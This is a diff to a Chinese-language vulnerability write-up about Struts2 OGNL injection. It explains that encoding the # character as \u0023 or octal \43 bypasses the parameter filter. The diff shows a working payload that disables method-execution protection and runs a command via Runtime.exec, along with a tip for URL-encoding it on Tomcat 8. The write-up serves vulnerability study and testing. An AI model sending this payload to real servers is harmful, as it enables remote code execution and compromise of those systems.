@@ -13,7 +13,7 @@
 
 ## Problem
 
-Ognl的上下文对象必须要使用#符号，Struts2虽然对#号进行过滤，但是没有考虑到编码情况，导致可以用unicode编码\u0023或者8进制\43绕过。
+Ognl的上下文对象必须要使用#符号，Struts2虽然对#号进行过滤，但是没有考虑到编码情况，导致可以用unicode编码\u0023或者八进制\43绕过。
 
 ## Environment
 
@@ -26,35 +26,15 @@ Ognl的上下文对象必须要使用#符号，Struts2虽然对#号进行过滤�
 
 ![{15189529-560B-45EC-9D26-EA6CEA8D80CC}_20200619162417](img/{15189529-560B-45EC-9D26-EA6CEA8D80CC}_20200619162417.jpg)
 
-## Payload
+payload:
 
-`?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)`
+```java
+?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)
+```
 
-## Debug
+vulhub有在tomcat8测试成功，大家可以试试：
 
-ParameterInterceptors函数会对所有的参数先进行一系列处理，确保用户提交的参数不存在OGNL表达式，最后使用OgnlUtil.setValue()函数将参数放入valueStack中。
-
-`xwork-2.0.5.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.class:91`
-
-<img src="img/clipboard1.png" alt="clipboard1" style="zoom:150%;" />
-
-检查参数是否存在OGNL表达式：(pattern ```[\p{Graph}&&[^,#:=]]*```)
-
-<img src="img/clipboard2.png" alt="clipboard2" style="zoom:150%;" />
-
-![clipboard3](img/clipboard3.png)
-
-OgnlUtil.setValue()函数将参数放入valueStack中：
-
-![clipboard4](img/clipboard4.png)
-
-在检查参数的过程中，使用正则表达式匹配是否存在Graph、#等关键字，没有考虑到参数编码的情况。可以使用unicode、八进制对```#```进行编码，绕过正则表达式检查。
-
-<img src="img/clipboard5.png" alt="clipboard5" style="zoom:150%;" />
-
-unicode/八进制编码在expressions.get后被转换为了#：
-
-![clipboard6](img/clipboard6.png)
+> 网上一些POC放到tomcat8下会返回400，研究了一下发现字符`\`、`"`不能直接放path里，需要urlencode，编码以后再发送就好了。
 
 ## Reference
 
